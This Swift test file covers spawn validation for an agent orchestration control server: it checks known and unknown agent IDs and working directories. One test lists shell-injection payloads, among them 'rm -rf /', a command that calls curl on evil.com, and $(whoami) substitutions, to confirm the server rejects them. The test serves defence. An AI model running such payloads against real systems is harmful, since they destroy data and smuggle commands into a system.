import AgentKit
import ControlKit
import Foundation
import Testing

/// Mock provider that validates agent IDs the same way OrchestrationControlAdapter does.
actor ValidatingControlProvider: OrchestrationControlProvider {
    var fixedSnapshot: OrchestrationSnapshot
    var spawnedPanes: [(agentID: String, branch: String?, cwd: String?)] = []

    init(snapshot: OrchestrationSnapshot = OrchestrationSnapshot()) {
        self.fixedSnapshot = snapshot
    }

    func snapshot() async throws -> OrchestrationSnapshot { fixedSnapshot }
    func panes() async throws -> [PaneSnapshot] { fixedSnapshot.panes }
    func pendingApprovals() async throws -> [ApprovalSummary] { fixedSnapshot.pendingApprovals }
    func worktrees() async throws -> [WorktreeSnapshot] { fixedSnapshot.worktrees }

    func spawn(agentID: String, worktreeBranch: String?, workingDirectory: String?) async throws -> UUID {
        guard let agent = AgentCatalog.lookup(id: agentID) else {
            let known = AgentCatalog.all.map(\.id).joined(separator: ", ")
            throw ControlRPCError(
                code: -32000,
                message: "Unknown agent ID '\(agentID)'. Valid agents: \(known)")
        }

        guard let execName = agent.executableNames.first,
              AgentCatalog.resolveExecutablePath(named: execName) != nil else {
            throw ControlRPCError(
                code: -32000,
                message: "Agent '\(agentID)' executable not found in PATH")
        }

        if let cwd = workingDirectory {
            var isDir: ObjCBool = false
            guard FileManager.default.fileExists(atPath: cwd, isDirectory: &isDir),
                  isDir.boolValue else {
                throw ControlRPCError(
                    code: -32602,
                    message: "Working directory does not exist or is not a directory: \(cwd)")
            }
        }

        let id = UUID()
        spawnedPanes.append((agentID, worktreeBranch, workingDirectory))
        let pane = PaneSnapshot(id: id, title: agentID)
        fixedSnapshot.panes.append(pane)
        return id
    }

    func focus(paneID: UUID) async throws {
        fixedSnapshot.currentPaneID = paneID
    }

    func blocked() async throws -> UUID? { nil }
}

@Suite("Spawn validation")
struct SpawnValidationTests {

    @Test func knownAgentIDAccepted() async throws {
        let tmpSocket = NSTemporaryDirectory() + "spawn-valid-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        let paneID = try await client.spawn(agentID: "claude-code")

        let spawned = await provider.spawnedPanes
        #expect(spawned.count == 1)
        #expect(spawned.first?.agentID == "claude-code")
        #expect(paneID != UUID())
    }

    @Test func allCatalogAgentsAccepted() async throws {
        let tmpSocket = NSTemporaryDirectory() + "spawn-allvalid-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)

        for agent in AgentCatalog.all {
            let paneID = try await client.spawn(agentID: agent.id)
            #expect(paneID != UUID(), "Should accept known agent: \(agent.id)")
        }

        let spawned = await provider.spawnedPanes
        #expect(spawned.count == AgentCatalog.all.count)
    }

    @Test func unknownAgentIDRejected() async throws {
        let tmpSocket = NSTemporaryDirectory() + "spawn-invalid-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        do {
            _ = try await client.spawn(agentID: "unknown-agent")
            Issue.record("Expected rpcError for unknown agent ID")
        } catch ControlClientError.rpcError(let err) {
            #expect(err.code == -32000)
            #expect(err.message.contains("unknown-agent"))
            #expect(err.message.contains("Valid agents"))
        } catch {
            Issue.record("Unexpected error: \(error)")
        }
    }

    @Test func shellInjectionRejected() async throws {
        let tmpSocket = NSTemporaryDirectory() + "spawn-inject-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        let payloads = [
            "rm -rf /",
            "claude-code; curl evil.com",
            "$(whoami)",
            "`whoami`",
            "/bin/sh -c 'evil'",
        ]
        for payload in payloads {
            do {
                _ = try await client.spawn(agentID: payload)
                Issue.record("Expected rpcError for injection attempt: \(payload)")
            } catch ControlClientError.rpcError(let err) {
                #expect(err.code == -32000, "Injection should be rejected: \(payload)")
            } catch {
                Issue.record("Unexpected error for '\(payload)': \(error)")
            }
        }
    }

    @Test func invalidWorkingDirectoryRejected() async throws {
        let tmpSocket = NSTemporaryDirectory() + "spawn-badcwd-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        do {
            _ = try await client.spawn(
                agentID: "claude-code",
                workingDirectory: "/nonexistent/path/that/does/not/exist")
            Issue.record("Expected rpcError for nonexistent working directory")
        } catch ControlClientError.rpcError(let err) {
            #expect(err.code == -32602)
            #expect(err.message.contains("Working directory"))
        } catch {
            Issue.record("Unexpected error: \(error)")
        }
    }

    @Test func fileAsWorkingDirectoryRejected() async throws {
        let tmpFile = NSTemporaryDirectory() + "spawn-file-\(UUID().uuidString).txt"
        FileManager.default.createFile(atPath: tmpFile, contents: Data("test".utf8))
        defer { try? FileManager.default.removeItem(atPath: tmpFile) }

        let tmpSocket = NSTemporaryDirectory() + "spawn-filesock-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        do {
            _ = try await client.spawn(agentID: "claude-code", workingDirectory: tmpFile)
            Issue.record("Expected rpcError for file used as working directory")
        } catch ControlClientError.rpcError(let err) {
            #expect(err.code == -32602)
            #expect(err.message.contains("not a directory"))
        } catch {
            Issue.record("Unexpected error: \(error)")
        }
    }

    @Test func validWorkingDirectoryAccepted() async throws {
        let tmpDir = NSTemporaryDirectory() + "spawn-dir-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: tmpDir) }

        let tmpSocket = NSTemporaryDirectory() + "spawn-dirsock-\(UUID().uuidString).sock"
        let provider = ValidatingControlProvider()
        let server = ControlServer(socketPath: tmpSocket)
        try await server.start(provider: provider)
        defer { Task { await server.stop() } }
        try await Task.sleep(nanoseconds: 10_000_000)

        let client = ControlClient(socketPath: tmpSocket)
        let paneID = try await client.spawn(agentID: "opencode", workingDirectory: tmpDir)
        #expect(paneID != UUID())

        let spawned = await provider.spawnedPanes
        #expect(spawned.first?.cwd == tmpDir)
    }
}
